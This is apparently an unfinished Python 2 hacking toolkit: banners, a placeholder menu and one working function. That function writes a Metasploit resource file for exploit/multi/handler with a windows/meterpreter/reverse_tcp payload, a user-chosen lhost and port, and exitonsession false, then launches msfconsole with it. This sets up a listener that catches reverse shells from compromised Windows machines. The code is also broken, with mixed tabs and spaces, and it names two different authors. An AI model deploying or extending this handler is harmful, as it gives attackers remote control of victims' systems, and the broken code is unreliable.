
### made by APS

### do not copy

### plese just enjoy it  
	
import subprocess,sys
import os,platform
import string
from time import sleep
from shutil import rmtree
from random import shuffle 
import multiprocessing
sys.dont_write_bytecode = True


class bcolors:
    PURPLE = '\033[95m'
    BLUE = '\033[94m'
    DARKCYAN = '\033[36m'
    GREEN = '\033[92m'
    OCRA = '\033[93m'
    RED = '\033[91m'
    ENDC = '\033[0m'
    BOLD = '\033[1m'
    UNDERLINE = '\033[4m'

def banner():
	bann= "\n\n"
	bann += "                                 __ _                                      \n"
    	bann += "                                / _' |                                     \n" 
    	bann += "                               | (_| |_ __                                 \n"
    	bann += "                                \__,_| '_ \                                \n"
    	bann += "                                     | |_) |___                            \n"
    	bann += "                                     | .__/ ___|                           \n"
    	bann += "                                     |_|  \___ \                           \n"
    	bann += "                                          |____/                           \n"
   	bann += "          made by L.D                                             V0.4     \n"
    	bann += "                                                                           \n"
    	sleep(0.3)
    	print(bcolors.RED + bcolors.BOLD + bann  + bcolors.ENDC + bcolors.ENDC)

def python_version_cheker():
	pyv = sys.version
	x = pyv[0]
	y = pyv[2]
	z = pyv[4]
	print("+"+78*'='+"+")
	print(26*' '+'Your Python is Version %s.%s.%s.'%(x,y,z))
	print("+"+78*'='+"+")
	
def menu():
	print("                                                                         ")
	print(35*' '+bcolors.OCRA+bcolors.BOLD+"MAIN MENU"+bcolors.ENDC)
	print(10*' '+"+==========================================================+") 
	print(10*' '+"|                            \                             |")               
 	print(10*' '+"|    ["+bcolors.OCRA+"1"+bcolors.ENDC+"] APSAPS              /    ["+bcolors.OCRA+"2"+bcolors.ENDC+"] APSAPS               |")
 	print(10*' '+"|                            \                             |")
 	print(10*' '+"|    ["+bcolors.OCRA+"3"+bcolors.ENDC+"] APSAPS              /    ["+bcolors.OCRA+"4"+bcolors.ENDC+"] APSAPS               |")
	print(10*' '+"|                            \                             |")  
	print(10*' '+"|    ["+bcolors.OCRA+"5"+bcolors.ENDC+"] APSAPS              /    ["+bcolors.OCRA+"6"+bcolors.ENDC+"] APSAPS               |")
	print(10*' '+"|                            \                             |")
	print(10*' '+"|    ["+bcolors.OCRA+"7"+bcolors.ENDC+"] APSAPS              /    ["+bcolors.OCRA+"8"+bcolors.ENDC+"] Msfconsole Handler   |")
	print(10*' '+"|                            \                             |")
	print(10*' '+"|    ["+bcolors.OCRA+"9"+bcolors.ENDC+"] APS Website         /    ["+bcolors.OCRA+"0"+bcolors.ENDC+"] EXIT                 |")
	print(10*' '+"|                            \                             |")
	print(10*' '+"+==========================================================+")

def clear():
    	subprocess.Popen( "cls" if platform.system() == "Windows" else "clear", shell=True)
   	sleep(0.1)

def exit_banner():
	print('''
88                                  	
88                                  
88                                  
88,dPPYba,  8b       d8  ,adPPYba,  
88P'    "8a `8b     d8' a8P_____88  
88       d8  `8b   d8'  8PP"""""""  
88b,   ,a8"   `8b,d8'   "8b,   ,aa  
8Y"Ybbd8"'      Y88'     `"Ybbd8"'  
                d8'                  
               d8'
''')

def msf_handler():
	rcn = raw_input("[>] Plese insert file name : "+bcolors.OCRA+bcolors.BOLD)
	print('\n')
	lh = raw_input(bcolors.ENDC+"[>] Plese insert lhost : "+bcolors.OCRA+bcolors.BOLD)
	print('\n')
	por = raw_input(bcolors.ENDC+"[>] Plese insert port : "+bcolors.OCRA+bcolors.BOLD)
	rcs = rcn+'.rc'
	fw = open(rcs,'w')
	fw.write('use exploit/multi/handler\n\n')
	fw.write('set payload windows/meterpreter/reverse_tcp\n\n')
	fw.write('set lhost '+lh+'\n\n')
	fw.write('set lport '+por+'\n\n\n')
	fw.write('set exitonsession false\n\n')
	fw.write('exploit -j')	
	fw.close()	
	cmd0 = os.system('msfconsole -r '+rcs)
































